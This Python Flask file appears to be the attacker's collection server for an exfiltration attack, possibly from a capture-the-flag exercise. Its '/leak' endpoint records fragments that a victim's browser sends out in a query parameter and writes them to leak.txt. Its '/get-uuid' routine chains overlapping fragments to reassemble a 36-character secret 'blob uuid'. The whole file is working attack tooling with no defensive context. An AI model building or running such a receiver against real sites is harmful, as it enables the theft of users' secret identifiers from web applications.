from flask import Flask, request
 
app = Flask(__name__)
BLOB_UUID_LENGTH = 36 # uuid 길이는 36으로 가정함
data = []

def leak_data():
    leak = [] 
    with open("leak.txt", "r") as file:
        for i in file:
            leak.append(i.strip())
    return leak

def gen_sample(start, checked, leak_data):
    storage = [start, checked]
    for data in leak_data:
        if start[len(start)-2:len(start)] == data[0:2]:
            storage[0] = start + data[2]
            storage[1] = True
            break
        else:
            storage[1] = False
    if storage[1] == True:
        for i in range(len(leak_data)):
            if data == leak_data[i]:
                del leak_data[i]
                break
    storage.append(leak_data)
    return storage

def update_leak_data(start, leak_data):
    for i in range(len(leak_data)):
        if start == leak_data[i]:
            del leak_data[i]
            break
    return leak_data

def main_gen(start):
    sample, checked, leak = start, True, update_leak_data(start, leak_data())

    while (checked == True):
        result = gen_sample(sample, checked, leak)
        sample, checked, leak = result[0], result[1], result[2]
    return sample

@app.route('/')
def index():
    return data

@app.route('/leak')
def leak():
    leak_data = request.args.get('q')
    data.append(leak_data)
    with open('leak.txt', 'w+') as file:
        file.write('\n'.join(data)) 
    return 'Nice working'

@app.route('/get-uuid')
def get():
    for data in leak_data():
        uuid = main_gen(data)
        if len(uuid) == BLOB_UUID_LENGTH:
            print(f'cool, blob uuid. -> {uuid}')
        else:
            pass # returns nothing
            #print(f'hmm nothing -> {uuid}')
    return 'Nice working'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3333)
